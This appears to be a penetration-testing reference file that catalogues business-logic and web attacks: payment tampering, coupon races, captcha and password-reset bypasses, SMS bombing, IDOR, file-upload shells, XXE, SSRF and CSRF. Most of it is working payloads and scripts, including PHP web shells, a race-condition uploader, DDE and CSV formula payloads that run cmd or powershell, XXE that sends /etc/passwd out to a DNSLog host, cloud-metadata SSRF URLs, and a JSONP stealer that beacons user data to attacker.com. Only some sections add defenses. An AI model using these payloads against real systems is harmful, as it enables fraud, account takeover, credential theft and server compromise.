# Business Logic Vulnerabilities — Extended Scenarios

> Companion to [SKILL.md](./SKILL.md), [METHODOLOGY.md](./METHODOLOGY.md), [CHECKLIST.md](./CHECKLIST.md). Contains payment security, captcha bypass, password reset flaws, user enumeration, traversal attack scenarios, and real-world cases.

---

## 1. Payment Precision and Overflow Attacks

### Integer Overflow

```text
# 32-bit signed int max: 2,147,483,647
# If quantity or price field is int32:
quantity: 2147483648 -> overflows to negative -> credit instead of debit

# In C/Java: int amount = price * quantity;
# If both are large positive -> result wraps to negative
```

### Decimal Precision Exploitation

```text
# Item price: 10.00, quantity supports decimals:
quantity: 0.001  -> charge: 0.01 (rounds down)
# But you still receive 1 item

# Partial refund manipulation:
# Original order: 3 items x 100 = 300
# Request refund for 2.9 items -> refund 290 -> keep all 3 items
```

### Negative Value Attacks

```text
# Negative quantity:
{"item": "laptop", "quantity": -1, "price": 999}
-> Total: -999 -> credit to account

# Negative shipping fee:
{"shipping_method": "express", "shipping_fee": -50}
-> Reduces total order cost

# Negative discount:
{"discount_amount": -100}
-> Adds 100 instead of subtracting
```

### Payment Parameter Tampering

Parameters to test modifying via Burp:

```text
price / amount / total         -> change to 0.01
discount_code / coupon_id      -> reuse / stack
currency / currency_code       -> change to weaker currency
payment_method / gateway       -> switch to test/sandbox gateway
installments / period          -> change to 0 or negative
account_id / receiver          -> change to attacker's account
return_url / notify_url        -> change to attacker's server (capture payment confirmation)
```

---

## 2. Condition Race — Practical Patterns

### One-Coupon-Per-Order Bypass

```bash
# Send 20 parallel requests using the same coupon:
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Cookie: session=..." \
    -d "coupon=SAVE50&order_id=12345" &
done
wait
# If check and deduction are non-atomic -> multiple applications succeed
```

### Gift Card Double-Spend

```text
# Burp Repeater: duplicate the redemption request 10 times
# "Send group in parallel" (Turbo Intruder or Repeater Groups)
# Race window: balance check -> deduction
# Multiple threads pass the balance check before any deduction commits
```

---

## 3. Captcha Bypass Techniques

### Drop the Verification Request

```text
# Normal flow:
1. Browser requests captcha image from /api/captcha
2. User enters captcha text
3. Form submits with captcha value

# Bypass: Use Burp to DROP the request to /api/captcha
# The server-side captcha remains the same -> use the same captcha value repeatedly
```

### Remove the Captcha Parameter

```text
# If backend checks: "if verifycode parameter exists, validate it"
# Remove the parameter entirely from the request:
# Before: username=admin&password=test&verifycode=abc123
# After:  username=admin&password=test
# -> Old code path without captcha validation
```

### Reset Captcha Failure Counter

```text
# Some apps track failed attempts in session/cookie
# Clear cookies between attempts -> failure counter resets to 0
# Or: create new session for each brute force attempt
```

### OCR-Based Captcha Cracking

```python
from PIL import Image
import pytesseract

# pip install pytesseract Pillow
# brew install tesseract (macOS)

img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(f"Captcha: {text.strip()}")
# Accuracy improves with preprocessing: grayscale, threshold, denoise
```

---

## 4. Arbitrary Password Reset Vulnerabilities

### Predictable Reset Token

```text
# Token patterns that are attackable:
token = md5(username)           -> compute for any user
token = md5(email + timestamp)  -> narrow brute force window
token = base64(user_id)         -> trivially reversible
token = sequential_number       -> enumerate
token = username + 4_digit_rand -> brute force 0000-9999
```

### Session Replacement Attack

```text
# Flow: Reset password for your own account
# Step 1: Request reset for YOUR email -> receive link
# Step 2: Click link -> reach "enter new password" page
# Step 3: In the same session, change the username/email parameter to VICTIM
# Step 4: Submit new password -> server uses session state (which user) not the parameter
# If session tracks "reset in progress" but not "for which user" -> reset victim's password
```

### Registration Overwrite

```text
# If username is unique but registration doesn't check existing accounts properly:
# Register with victim's username -> old account is overwritten or merged
# Now login with the password you just set -> access victim's data
```

---

## 5. User Information Enumeration

### Login Error Message Difference

```text
# Vulnerable:
username: admin     -> "Incorrect password" (confirms user exists)
username: nonexist  -> "User not found" (confirms user doesn't exist)

# Secure:
Both cases -> "Invalid username or password"
```

### Masked Data Reconstruction

```text
# Phone number masking: 138****5678
# Email masking: a****@gmail.com
# If different endpoints mask differently:
#   Endpoint A: 138****5678
#   Endpoint B: 1384***5678
#   Endpoint C: 13845**678
# Combine -> reconstruct: 13845675678
```

### Cookie-Based Authorization Bypass

```text
# Cookie: uid=dXNlcjE=  (base64 of "user1")
# Change to: uid=YWRtaW4x  (base64 of "admin1")
# If server trusts the cookie without server-side session validation -> vertical privilege escalation
```

---

## 6. Functional Restriction Bypass

### Array Parameter for Multiple Coupons

```text
# Normal: couponid=SAVE20 (one coupon per order)
# Bypass: couponid[0]=SAVE20&couponid[1]=SAVE30
# Or JSON: {"coupon_ids": ["SAVE20", "SAVE30", "WELCOME10"]}
# If backend iterates the array and applies each -> stacks discounts beyond limit
```

### Frontend-Only Restrictions

```text
# HTML: <input type="text" disabled="disabled" readonly="readonly" value="110010">
# Developer Tools: remove disabled/readonly attributes -> field becomes editable
# Or: Burp intercepts response -> removes disabled attribute -> user can modify
# Or: directly craft POST request with modified value
```

---

## 7. Denial of Service via Business Logic

### Application-Layer DoS (not DDoS)

```text
# Single malformed request causes CPU spike:
# CVE-2015-4024: PHP multipart/form-data with crafted boundary -> regex backtracking
# CVE-2020-13935: Tomcat WebSocket with crafted frames -> infinite loop
# CVE-2013-2028: Nginx chunked transfer with negative size -> buffer overflow

# Tools:
# tcdos - WebSocket DoS tool:
python3 tcdos.py -u ws://target/endpoint -t 10
```

---

## 8. PAYMENT MANIPULATION MATRIX

| # | Attack | Method |
|---|---|---|
| 1 | Price parameter tampering | Change `amount=100` to `amount=1` in checkout request |
| 2 | Negative quantity/amount | `quantity=-1` or `amount=-100` for refund credit |
| 3 | Currency confusion | Change `currency=USD` to `currency=IDR` (lower value) |
| 4 | Callback notification forgery | Forge payment gateway callback to mark order as paid |
| 5 | Race condition on payment | Concurrent checkout with same cart -> duplicate purchase at single price |
| 6 | Coupon stacking | Apply same coupon multiple times or combine incompatible coupons |
| 7 | Refund without return | Initiate refund flow but skip item return step |
| 8 | Payment status manipulation | Change order status from "pending" to "paid" via API |
| 9 | Split transaction bypass | Split large amount into multiple small amounts below verification threshold |
| 10 | MongoDB operator injection | `{"price": {"$gt": 0}}` instead of numeric value |

### Testing Methodology

```
1. Map the complete payment flow (cart -> checkout -> payment -> callback -> confirmation)
2. At each step, test: parameter tampering, step skipping, replay, race condition
3. Check if price is recalculated server-side or trusts client value
4. Test callback endpoint: Does it verify signature? Source IP? Idempotency?
5. Test refund flow separately: same vulnerabilities may exist in reverse
```

---

## 9. STATE MACHINE BYPASS METHODOLOGY

### Common Multi-Step Process Attacks

| Attack | How |
|---|---|
| Frontend step skip | Navigate directly to final step URL (e.g., `/step3` without completing step 1-2) |
| Response manipulation | Change `{"step":"1","allowed":"false"}` to `{"step":"3","allowed":"true"}` |
| Direct state modification | API call to change order status: `PUT /order/123 {"status":"completed"}` |
| Replay previous step | Complete step 2, then replay step 1 with modified data |
| Session swap | Start flow as user A, complete as user B (different session) |

### Verification Bypass Pattern

```
Step 1: Request verification code -> code sent to email/phone
Step 2: Enter verification code -> server validates
Step 3: Set new password -> server allows

Attack: Skip step 2 entirely
- Try: POST /reset-password directly (step 3 URL)
- Try: Response manipulation -- change step 2 response from "fail" to "success"
- Try: DOM manipulation -- remove disabled attribute from step 3 form
- Try: Modify cookie/session to reflect "step 2 completed"
```

---

## 10. Privacy Compliance & Real-Name Authentication Cases

### 10.1 Real-Name "Replay-To-Reset" Loop

Anti-addiction or KYC systems often allow re-editing identity info only when a previous submission was rejected. Bypass:

```text
1. Submit real-name auth with INTENTIONALLY wrong cardNumber:
   POST /auth/realname  
   {
     "realName": "Test",
     "cardNumber": "...6012",   <- wrong on purpose
     "frontImage": "<base64>",
     "backImage":  "<base64>"
   }

2. Server response (the surprising part):
   {"msg": "success", "code": 200, "data": null, "ok": true}
   <- server stores it as "submitted/under review", but business logic treats as "rejected"

3. UI now offers an Edit button -> resubmit again with another (target) identity
   -> real-name binding switches WITHOUT triggering the "permanent lock" branch
```

Why this works: the controller writes "submitted" to DB on every POST and the rejection branch resets the editable flag instead of locking the user.

Defense: rejected real-name submissions must (a) require human review or (b) lock the account for 24h+, never silently re-open the editor.

Compliance impact: enables anti-addiction circumvention (minors), account resale, and KYC laundering.

### 10.2 Identity Card / Phone Enumeration via Side-Channel

A KYC pre-check API answers "is this realName + idCard combo valid?" through subtle response differences:

```text
Burp Intruder payload: incrementing idCard suffixes
Status: 200 (always), but Length differs:
  Length: 531  <- "first valid combination"  
  Length: 501  <- invalid

Or response code differences:
  HTTP 200 + body code:200  -> valid binding
  HTTP 200 + body code:501  -> wrong card
  HTTP 200 + body code:531  -> name-card mismatch but card exists
```

Defense: unify all failure paths into one indistinguishable response. Add per-IP/per-deviceId throttling.

### 10.3 Masked Field Cross-Endpoint Reconstruction

Phone numbers masked differently across endpoints:
```
/api/profile/me        -> 138****5678
/api/order/list        -> 1384***5678
/api/coupon/list       -> 13845**678
/api/notice/preview    -> 138456*5678
```
Combine masked positions across endpoints to reconstruct full digits.

Defense: pick ONE masking rule and enforce it via a shared library.

### 10.4 Sensitive Field Leak in Common Responses

```http
GET /api/user/profile
{
  "id": 31, "username": "alice",
  "password": "$2a$10$...",
  "id_card": "320...8412",
  "phone": "13888888888",
  "real_name": "...",
  "address": "..."
}
```
Verify: search every response for keys `password`, `passwd`, `salt`, `id_card`, `idcard`, `cardNumber`, `bankCard`, `email`, `phone`, `mobile`.

---

## 11. Payment Vulnerability Cases

### 11.1 Free Purchase via `prizeIdList` Removal

```http
POST /activity/register
{
  "activityId": "...",
  "prizeIdList": ["6264e6948fe587000113e2d9"],
  "userId": "..."
}
-> {"ok": true, "payType": "paid", "amount": 38}

# Modified request - prizeIdList REMOVED entirely
POST /activity/register
{
  "activityId": "...",
  "userId": "..."
}
-> {"ok": true, "payType": "free"}      <- free registration, still takes effect
```

Root cause: server treats "no paid prize listed" as "no payment required", but the activity DB record still grants the event seat.

### 11.2 Free Purchase via Decimal Quantity

```http
PUT /cart/update
{"id": 114016, "skuQty": 0.02}

# Cart UI shows: 500.00 -> 10.00
# Checkout passes, payment charges 10
# Order shipped: 1 full item
```

Variant - food delivery:
```http
POST /order/place
{"items": [{"FoodNum": 0.01, "foodId": 88}]}

# Item 68 -> payable 0.68
```

Defense: validate `quantity in Z and quantity >= 1` server-side. Never multiply float quantity by float price; convert to integer cents and integer count.

### 11.3 Half-Price Recharge via Decimal Precision

```http
POST /wallet/recharge
{"amount": 0.019}

# Pay gateway charges: 0.01 (rounded down)
# Wallet credit:       0.02 (rounded up)
# Net per cycle:       0.01 free
```

Defense: keep all monetary values as integer cents end-to-end.

### 11.4 Negative Coupon / Negative Quantity — Reverse Charge

```http
POST /checkout
{"price": 99, "couponAmount": -100}     -> final price = 99 + 100 = 199
{"itemId": "x", "quantity": -5, "price": 100}  -> total = -500 -> bank credit
```

Test order: per-field, swap to `-1`, `0`, `99999999`, `0.01`, `-99.99`.

### 11.5 Status Field Forgery — Skip Real Payment

```http
POST /order/submit
{
  "cart_id": "1234",
  "payment_status": "paid",       <- client-controlled, server trusts
  "is_paid": 1
}
-> {"orderStatus": "success"}
```

Companion bug - client trusts a server response field:
```http
# Real server response:
{"error_msg":"old password wrong","error_code":99999,"success":false}
# Modified by Burp on the way back to the browser:
{"success": true, "error_code": 1}
```
Frontend's `if (response.success) { goNextStep(); }` happily proceeds.

### 11.6 Coupon / Optional Currency Fields — Stack & Override

The full per-field test list:
```
price | amount | total | total_amount | total_price       -> 0.01, -100, 999999999
discount_code | coupon_id | coupon_amount               -> reuse, stack, negative
currency | currency_code | currency_unit                -> switch USD <-> IDR <-> VND
payment_method | gateway | channel                     -> invalid name, sandbox name
installments | period                                  -> 0, -1, 99
account_id | receiver | username | uid                 -> swap to attacker / victim
return_url | notify_url | callback_url                  -> attacker server
```

### 11.7 Multi-Device Concurrent Subscription Discount

```text
1. Login same account on 3 devices (or 3 browser sessions in incognito)
2. On each, walk through to the payment page but DO NOT click pay yet
3. On device 1, complete payment -> VIP +1 month at discount price
4. Within 30s, complete payment on device 2 -> +1 month at discount price again (server not locked)
5. Repeat on device 3
-> One discount = N months VIP
```

---

## 12. Registration / Captcha Real-World Cases

### 12.1 Captcha Not Bound to Phone Number — Account Hijack via Registration

```text
Normal flow:
  1. Enter phone: 13888888887
  2. Receive SMS code: 1468
  3. POST /register  body: {"phone": "13888888887", "code": "1468", "username": "self"}

Bypass flow:
  1. Send code to YOUR phone:  13888888887 -> code "1468" arrives
  2. Burp intercept the registration POST:
     {"phone": "VICTIM_PHONE", "code": "1468", "username": "self"}
  3. Backend only checks "the latest issued code is 1468" globally -> registers a NEW
     account bound to VICTIM_PHONE
```

Defense: pair (phone, code) atomically.

### 12.2 SMS Bombing — Six Bypass Patterns

When basic flow `POST /sendCode {"phone": "..."}` is rate-limited:

```text
1. CONCURRENCY:  Turbo Intruder concurrentConnections=30
2. COOKIE TRICK: Delete JSESSIONID -> send -> server resets per-session counter to 0
3. WHITESPACE / ENCODING:
     "phone": "13888888888 "     (trailing space)
     "phone": "+8613888888888"
     "phone": "008613888888888"
     "phone": "13888888888\r\n"
     "phone": "13888888888,13888888888"   (some backends split, send twice)
4. LENGTH OVERFLOW: send 12 digits "138888888889" - gateway truncates to first 11,
   while the per-number counter sees a "different" number.
5. PARAMETER POLLUTION: ?phone=A&phone=A   (or phone=[A,A] in JSON arrays)
6. MULTI-INTERFACE: same SMS service exposed at /api/sendCode AND /api/v2/sendCode,
   counter not shared.
```

Defense: trim+normalize the phone field server-side before any rate-limiting decision.

### 12.3 Captcha Echoed in Response

```http
GET /tcode.html?phoneNumber=18888888887
HTTP/1.1 200 OK
{"msg": "OK", "randm": 9759, "code": 0}
                    ^^^^^^
                    actual SMS code
```
Audit move: grep responses for `"randm"`, `"verify_code"`, `"captcha"`, `"sms_code"`.

### 12.4 Frontend Form Bypass — Direct Backend Call

```text
Front-end has:    image_captcha + sms_code + phone + password
                  client-side JS rejects empty fields
Backend handler:  /api/register  validates only sms_code+phone

Bypass: directly call /api/register without image_captcha - server accepts.
```

### 12.5 Password Field XSS (Stored)

Registration nickname/bio/signature commonly accepts:
```html
<img src=x onerror=alert(document.cookie)>
```
Render context matters - verify it triggers in profile page/comment area/admin user-list.

---

## 13. Password Recovery Real-World Cases

### 13.1 `auth = md5(rand())` on Windows PHP — Full Enumeration

```php
// Vulnerable token generator on Windows PHP:
$auth = md5(rand());          // RAND_MAX = 32768 on Windows builds
$link = "/resetpassword.php?id=$auth";
mail($user, "click: $link");
```

Attacker dictionary:
```php
<?php
$dict = [];
for ($i = 0; $i <= 32768; $i++) {
    $dict[] = md5($i);
}
file_put_contents('auth_dict.txt', implode("\n", $dict));
```

Burp Intruder over `/resetpassword.php?id=MD5` with the dictionary.

Variants:
- `mt_rand()` without `mt_srand()` on PHP < 7.1 - predictable seed
- `Math.random()` in Node.js - Xorshift128+, can be reversed from ~5 outputs
- C# `new Random()` default seed = `Environment.TickCount` - narrow range

### 13.2 Session-Replacement Reset Attack

```text
1. Attacker: request password reset for ATTACKER@example.com -> receive email with valid token
2. Attacker: open the email link -> reach "enter new password" page
3. Burp intercept the final POST:
     POST /reset/setpwd
     {"email": "ATTACKER@example.com", "newPwd": "P@ssw0rd!"}
   -> Modify to:
     {"email": "VICTIM@example.com",   "newPwd": "P@ssw0rd!"}
4. Server checks "is there an in-progress reset in session?" -> YES -> applies new password to
   whatever email is in the body -> victim's password is now P@ssw0rd!
```

Root cause: server stores "reset in progress" in the session but does NOT bind it to the originally-validated email.

### 13.3 Reset Code Replacement in Verification Step

```text
Step 1: Enter username: "victim"           -> server says "code sent to victim's phone"
Step 2: Enter code:     "111111" (wrong)   -> server returns failure
Step 3: Burp intercepts the failure response  -> modify to:
        {"success": true, "step": 3}
Step 4: Front-end sees success -> moves to "set new password" page
Step 5: Submit new password -> server (without re-validating step 2) accepts -> victim's password reset
```

### 13.4 Reset Token NOT Bound to Account

```text
1. Account A (yours): request reset -> receive token T_A
2. Account B (victim): request reset -> receive token T_B (you don't see this)
3. Use TOKEN T_A but specify VICTIM in URL/body:
     /reset/confirm?token=T_A&user=victim
4. Server: "T_A is valid, confirm reset for whoever the body says" -> resets victim
```

Defense: at token issuance, persist `(token, user_id, expiry, used_flag)` and validate every step.

### 13.5 Email-Change -> Reset-Token Replay

```text
1. Have account A -> request reset -> token T issued via email
2. Login normally -> change email from A@... to A2@...
3. Token T was bound to email A@..., now use it:
     POST /reset/confirm  {"token": "T", "newPwd": "..."}
   If server bound token to email-string but doesn't enforce "current user's current email"
   -> replay still works, hijacks the account.
```

### 13.6 Email Verification Bypass via Registration

```text
Register account with VICTIM@example.com (unverified):
  -> If the system creates the account immediately and "merges" with future verified attempts,
    the attacker can pre-register every interesting username/email and wait.
  -> If victim later signs up with the same email, server may treat as "repeat registration"
    and forward auth state to the existing record -> attacker takeover.
```

### 13.7 Mobile-Scenario Redirect Hijack

```text
After password reset, server redirects:
  GET /reset/done?next=/login

Bypass:
  GET /reset/done?next=https://attacker.com/login
  GET /reset/done?next=//attacker.com
  GET /reset/done?next=/login@attacker.com
  GET /reset/done?next=javascript:alert(1)
```

---

## 14. IDOR / Authorization — Reproducible Drills

### 14.1 Horizontal IDOR — One-Field-Swap Drill

```bash
SESSION_A="<your own cookie>"
A_RESOURCE_ID=10001
B_RESOURCE_ID=10002

curl -s -H "Cookie: $SESSION_A" \
     "https://target/api/orders/$A_RESOURCE_ID" -o /tmp/a.json

curl -s -H "Cookie: $SESSION_A" \
     "https://target/api/orders/$B_RESOURCE_ID" -o /tmp/b.json

diff /tmp/a.json /tmp/b.json
```

If `b.json` returns a real order belonging to user B, it's IDOR. Stop at the first three confirmed hits and report, do not exfiltrate volume.

### 14.2 Vertical IDOR — Role / is_admin Switch in Body

```http
POST /api/user/profile/update HTTP/1.1
Host: target.com
Cookie: session=NORMAL_USER
Content-Type: application/json

{
  "uid": 10001,
  "nickname": "test",
  "role": "admin",
  "is_admin": true,
  "level": 99,
  "department_id": 1
}
```

Replay and immediately call an admin-only endpoint with the same cookie.

### 14.3 UID-vs-Token Mismatch

```python
import requests

S_A = requests.Session()
S_A.cookies.set("token", "TOKEN_A_VALID")

for victim_uid in range(10000, 10010):
    r = S_A.get(f"https://target/api/account/info",
                params={"uid": victim_uid})
    print(victim_uid, r.status_code, r.text[:200])
```

Token is A's, `uid` is B's. If response varies by `uid`, it's classic horizontal IDOR.

### 14.4 Email / Phone Re-bind Without Old-Verifier

```http
POST /api/user/bind/email HTTP/1.1
Cookie: session=VICTIM_SESSION
Content-Type: application/json

{
  "new_email": "attacker@evil.com",
  "verify_code": "ANY"
}
```

Three classes of bug:
1. Endpoint accepts new email without old email confirmation -> takeover.
2. Endpoint accepts any `verify_code` -> broken validation.
3. Endpoint accepts request without any code field -> no enforcement.

### 14.5 Multi-Channel Inconsistency Sweep

```bash
curl -X POST https://web.target.com/api/v1/order/cancel/123 ...
curl -X POST https://m.target.com/h5/order/cancel \
     -d "id=123" ...
curl -X POST https://api.target.com/mobile/order/cancel \
     -H "User-Agent: TargetApp/3.5.0 (Android)" \
     -d "id=123" ...
curl -X POST https://target.com/admin/order/cancel \
     -d "order_id=123" ...
```

Web blocks, mobile open. App blocks, internal API open. Always test all entry points.

---

## 15. File Upload — Payload Library and Reproduction Windows

### 15.1 Extension Bypass Lab

For each upload point, run all eight below before declaring it safe:

```text
shell.php                    <- naive blacklist absent
shell.php5 / .phtml / .pht   <- rare extensions still served by Apache
shell.PhP / .pHP             <- case-mix
shell.php.jpg                <- double-ext, server picks first
shell.php;.jpg               <- Apache ;-split
shell.php%00.jpg             <- null byte (still alive on legacy stacks)
shell.php.                   <- trailing dot (Windows IIS)
shell.php/                   <- trailing slash (some routes)
```

Companion JSP/ASP/WAR variants:
```text
shell.jsp / .jspx / .jsw / .jsv / .jspf
shell.aspx / .asp / .asa / .cer / .cdx / .htr
exploit.war (deploy via Tomcat manager)
```

### 15.2 Polyglot Upload — Image That Is Also a Shell

```bash
# JPG header + PHP shell appended:
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' \
  > poly.jpg
echo '<?php @eval($_REQUEST[0]); ?>' >> poly.jpg
```

Verify the file is still recognized as a JPG by `file poly.jpg`.

### 15.3 Office (docx/xlsx) Repack with XXE / DDE

```bash
mkdir doc-payload && cd doc-payload
unzip ../template.docx
# Inject XXE in word/document.xml:
sed -i 's#<w:body>#<w:body><!DOCTYPE foo [<!ENTITY x SYSTEM "http://evil/dtd">]>\&x;#' \
    word/document.xml
zip -r ../malicious.docx .
```

DDE variant (executes on Excel open with default settings on legacy Office):
```text
=cmd|'/c calc.exe'!A1
=cmd|'/c powershell -nop -w hidden -c "..."'!A1
```

### 15.4 Filename Path Traversal — Storage Pwn

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---x

---x
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/shell.php"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>
---x--
```

### 15.5 Race-Window Exploit — File Available Before AV Cleanup

```python
import requests, threading, time

UPLOAD = "https://target/api/upload"
ACCESS = "https://target/uploads/{}/shell.php"

def upload(i):
    files = {"file": ("shell.php", "<?php system($_GET[0]); ?>", "image/jpeg")}
    r = requests.post(UPLOAD, files=files, cookies={"session": "..."})
    return r.json().get("path")

def hammer_access(path):
    deadline = time.time() + 10
    while time.time() < deadline:
        r = requests.get(ACCESS.format(path), params={"0": "id"})
        if "uid=" in r.text:
            print("HIT", path); break

paths = [upload(i) for i in range(20)]
for p in paths:
    threading.Thread(target=hammer_access, args=(p,)).start()
```

### 15.6 ZIP Bomb (Defense Verification, Use With Care)

```bash
# 42.zip (10MB on disk -> 4.5PB decompressed)
# Upload to a "decompress on import" endpoint
# If server CPU spikes/OOMs after import, decompression is unbounded.
```

Defense check: server must enforce single-file-decompressed-size + total-decompressed-size.

### 15.7 CSV / XLSX Formula Injection

```csv
name,email
=cmd|'/c calc'!A1,attacker@example.com
=HYPERLINK("http://evil/?u="&A2&A3,"click here"),admin@target.com
@SUM(1+1)*cmd|'/c calc'!A1,test@example.com
+1+cmd|'/c calc'!A1,test2@example.com
-1+cmd|'/c calc'!A1,test3@example.com
```

Defense: prefix every field starting with `=`, `+`, `-`, `@` with a single quote.

---

## 16. SSRF / XXE / Out-of-Band — Field-Ready Payloads

### 16.1 OOB Setup — One-Line Listeners

```bash
# DNSLog: register at dnslog.cn or dnslog.io
# Burp Collaborator: Burp menu -> Collaborator client -> "Copy to clipboard"

# Self-hosted:
python3 -m http.server 8080
# or:
ncat -lv -p 8080 -k -c 'cat'
```

### 16.2 XXE — Direct Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root><name>&x;</name></root>
```

Send as `Content-Type: application/xml` to any XML-consuming endpoint.

### 16.3 XXE — Blind, OOB Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd  SYSTEM "http://YOUR.dnslog.cn/x.dtd">
  %dtd;
  %send;
]>
<root></root>
```

Host on YOUR server `x.dtd`:

```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://YOUR.dnslog.cn/?d=%file;'>">
%all;
```

### 16.4 SSRF — Cloud Metadata Sweep

```text
http://169.254.169.254/latest/meta-data/                  # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
http://metadata.google.internal/computeMetadata/v1/    + Header: Metadata-Flavor: Google
http://100.100.100.200/latest/meta-data/                  # Aliyun
http://169.254.169.254/metadata/instance?api-version=2021-02-01  + Header: Metadata: true (Azure)
```

### 16.5 SSRF — Internal Asset Discovery

```text
http://127.0.0.1:6379/                  # Redis
http://127.0.0.1:11211/stats            # Memcached (try gopher)
http://127.0.0.1:8500/v1/agent/self     # Consul
http://127.0.0.1:2379/v2/keys           # etcd
http://127.0.0.1:9200/_cat/indices?v    # Elasticsearch
http://127.0.0.1:5432/                  # PostgreSQL (banner)
http://10.0.0.0/8 ranges                # Internal APIs
```

`gopher://` payload to write to internal Redis:
```text
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a ...
```
Generate with `gopherus`.

### 16.6 SSRF — DNS Rebinding Bypass

If server resolves URL once then validates resolved IP, but fetches later separately, point your domain at TTL=0 record that flips between `1.2.3.4` (passes validation) and `127.0.0.1` (attack target).

Tools: `whonow` (github.com/brannondorsey/whonow)

### 16.7 CSRF — Auto-Submitting Form Template

```html
<!DOCTYPE html>
<html><body>
<form id=f action="https://target/api/withdraw" method="POST"
      enctype="application/x-www-form-urlencoded">
  <input name="amount" value="999999">
  <input name="to_account" value="attacker_account">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>
```

Defense: SameSite=Lax/Strict cookie + Anti-CSRF token + Origin/Referer check.

### 16.8 JSONP-as-Read-Primitive

```html
<script src="https://target.com/api/user/profile?callback=stealUserProfile"></script>
<script>
function stealUserProfile(data) {
  navigator.sendBeacon("https://attacker.com/log", JSON.stringify(data));
}
</script>
```

Defense: do not return sensitive data via JSONP; if required, restrict callback function names to a whitelist.

---

## 17. Reproduction Windows — When Each Class of Bug Is Reachable

| Bug class | Best window to test | Why |
|-----------|---------------------|-----|
| Race conditions on payment/coupon | 03:00-05:00 local time | Lower traffic, RDS/Redis less contended, race window widens |
| Integer overflow on price x qty | After deploy (release notes available) | New flows often miss the upper-bound guard |
| Verification-code rate limit | Any time, but bursts <=30s | Most rate limiters use sliding windows of 60s |
| Brand-new IDOR | First 24h after a feature ships | Org-level RBAC seldom audits new endpoints in time |
| File-upload race | Right after off-peak AV-scan window | Scanner loaded, not running, files sit longer |
| SSRF on cloud assets | Any time | Metadata endpoints don't sleep |

When a target has change-control windows, capture `Last-Modified` on JS bundles and re-test 48h after every push.
